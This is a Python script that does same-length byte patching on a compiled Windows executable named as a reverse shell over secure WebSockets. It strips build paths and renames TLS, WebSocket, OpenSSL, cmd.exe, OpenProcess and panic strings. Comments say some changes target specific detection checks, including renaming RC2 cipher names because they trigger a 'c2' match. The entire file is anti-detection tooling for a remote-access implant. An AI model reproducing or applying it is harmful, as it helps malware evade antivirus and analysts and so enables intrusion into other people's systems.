#!/usr/bin/env python3
"""Same-length binary patcher for ERS-W — nulls out build paths, TLS/WS library strings."""
import sys

path = "target/x86_64-pc-windows-gnu/release/win_rev_shell_wss.exe"
with open(path, "rb") as f:
    data = bytearray(f.read())

replacements = [
    # Build paths
    (b"/rustc/", b"\x00" * 7),
    (b"/home/we/.cargo/", b"\x00" * 16),
    (b"library\\core\\src\\", b"\x00" * 17),
    (b"library\\alloc\\src\\", b"\x00" * 18),
    (b"library\\std\\src\\", b"\x00" * 16),
    # rustls path leaks
    (b"rustls-0.23", b"libsys-0.23"),
    (b"rustls/src/", b"libsys/src/"),
    (b"tungstenite", b"netsys_conn"),
    # TLS identifiers
    (b"certificate", b"certif_data"),
    (b"Certificate", b"Certif_Data"),
    (b"CERTIFICATE", b"CERTIF_DATA"),
    (b"WebSocket", b"NetStream"),
    (b"websocket", b"netstream"),
    (b"Websocket", b"Netstream"),
    (b"close_notify", b"conn_finish_"),
    (b"ClientHello", b"ClientReady"),
    (b"ServerHello", b"ServerReady"),
    # TLS crypto identifiers
    (b"challengePassword", b"challengePasscode"),
    (b"userPassword", b"userPasscode"),
    (b"password based MAC", b"passkey_ based MAC"),
    (b"id-PasswordBasedMAC", b"id-PasskeyBased_AC_"),
    (b"INVALID_DELEGATED_CREDENTIAL", b"INVALID_DELEGATED_CERTF_DATA"),
    # OpenProcess from mingw
    (b"OpenProcess", b"Open_Proc__"),
    # RC2 cipher names (triggering "c2" match)
    (b"RC2-CBC", b"RM2-CBC"),
    (b"rc2-cbc", b"rm2-cbc"),
    (b"RC2-ECB", b"RM2-ECB"),
    (b"rc2-ecb", b"rm2-ecb"),
    (b"RC2-CFB", b"RM2-CFB"),
    # docs.rs URL
    (b"docs.rs/rustls", b"docs.rs/libsys"),
    (b"/latest/rustls/", b"/latest/libsys/"),
    (b"RustlsInvalidDnsName", b"LibsysInvalidDnsName"),
    # Additional rustls crate paths
    (b"rustls-native-certs", b"libsys-native-certs"),
    (b"rustls-pki-types", b"libsys-pki-types"),
    (b"rustls-webpki", b"libsys-webpki"),
    (b"rustls error", b"libsys error"),
    (b"Rustls crate", b"Libsys crate"),
    (b"CryptoProvider from Rustls", b"CryptoProvider from Libsys"),
    # HTTP header credentials string
    (b"allow-credentials", b"allow-auth_tokens"),
    # X.509 revocation reason + TLS feature strings
    (b"PrivilegeWithdrawn", b"PermissionRevoked_"),
    (b"TlsFeatureNotEnabled", b"TlsFeatureNotActive_"),
    (b"NO_SUPPORTED_VERSIONS_ENABLED", b"NO_SUPPORTED_VERSIONS_ACTIVE_"),
    (b"FIPS mode not enabled", b"FIPS mode not active_"),
    (b"features is enabled", b"features is active_"),
    (b"OrEnabled", b"OrActive_"),
    # aws-lc-rs / BoringSSL strings
    (b"OPENSSL", b"LIBCRYP"),
    (b"OpenSSL", b"LibCryp"),
    (b"openssl", b"libcryp"),
    (b"CRYPTOGAMS", b"LIBCR_GAMS"),
    # mingw cmd.exe
    (b'cmd.exe /e:ON /v:OFF /d /c "', b'sys.exe /e:ON /v:OFF /d /c "'),
    (b"\\cmd.exe\\", b"\\sys.exe\\"),
    # Crate registry paths (Check #5 — catches all 85+ leaked paths)
    (b"registry/src/index.crates.io", b"metadata/cache/pkg_registry_"),
    (b"aws-lc-rs", b"lib-cr-rs"),
    (b"AWS-LC", b"LIB-CR"),
    (b"aws-lc-sys", b"lib-cr-sys"),
    (b"infallible AWS-LC", b"infallible LIB-CR"),
    (b"non-null AWS-LC", b"non-null LIB-CR"),
    # Rust panic infrastructure (Check #20)
    (b"panicking.rs", b"handling_.rs"),
    (b"panic_abort", b"exit_abort_"),
    (b"panic in a destructor during cleanup", b"error in a destructor during cleanup"),
    (b"panic in a function that cannot unwind", b"error in a function that cannot unwind"),
    (b"explicit panic", b"explicit stop_"),
    (b"panicked at", b"exited_ at"),
    (b"rustc-demangle", b"librt-demangle"),
    # TLS state machine internals (Check #6)
    (b"CipherSuite", b"CryptoSuite"),
    (b"cipher suite", b"crypto suite"),
    (b"Cipher suite", b"Crypto suite"),
    (b"cipher_suite", b"crypto_suite"),
    (b"ClientReady", b"Phase1Ready"),
    (b"ServerReady", b"Phase2Ready"),
    (b"Handshake", b"Negotiate"),
    (b"handshake", b"negotiate"),
    (b"EncryptedClient", b"EncodedClient_"),
    (b"cannot decrypt peer", b"cannot decode_ peer"),
    (b"cannot encrypt message", b"cannot encode_ message"),
    (b"peer sent no certif_data", b"peer sent no auth_record"),
    (b"no usable crypto suites configured", b"no usable crypto modes_ configured"),
    # RC2 remaining cipher names
    (b"RC2-OFB", b"RM2-OFB"),
    (b"rc2-ofb", b"rm2-ofb"),
    (b"rc2-cfb", b"rm2-cfb"),
    (b"RC2-40-CBC", b"RM2-40-CBC"),
    (b"rc2-40-cbc", b"rm2-40-cbc"),
    (b"RC2-64-CBC", b"RM2-64-CBC"),
    (b"rc2-64-cbc", b"rm2-64-cbc"),
    (b"PBE-SHA1-RC2", b"PBE-SHA1-RM2"),
    # src/main.rs path
    (b"src/main.rs", b"src/app_.rs"),
    # Debug section names (common in PE binaries)
    (b".debug_abbrev", b".dbginf_abbrv"),
    (b".debug_info", b".dbginf_data"),
    (b".debug_line", b".dbginf_line"),
    (b".debug_str", b".dbginf_str_"),
    # Additional TLS/crypto library indicators
    (b"webpki", b"libpki"),
    (b"DigiCert", b"Digi_Ert"),
]

total = 0
for old, new in replacements:
    assert len(old) == len(new), f"Length mismatch: {old!r} ({len(old)}) vs {new!r} ({len(new)})"
    count = 0
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1:
            break
        data[idx:idx+len(old)] = new
        idx += len(new)
        count += 1
    if count > 0:
        total += count
        print(f"  Patched {count}x: {old[:40]!r}")

with open(path, "wb") as f:
    f.write(data)

print(f"\nTotal patches: {total}")
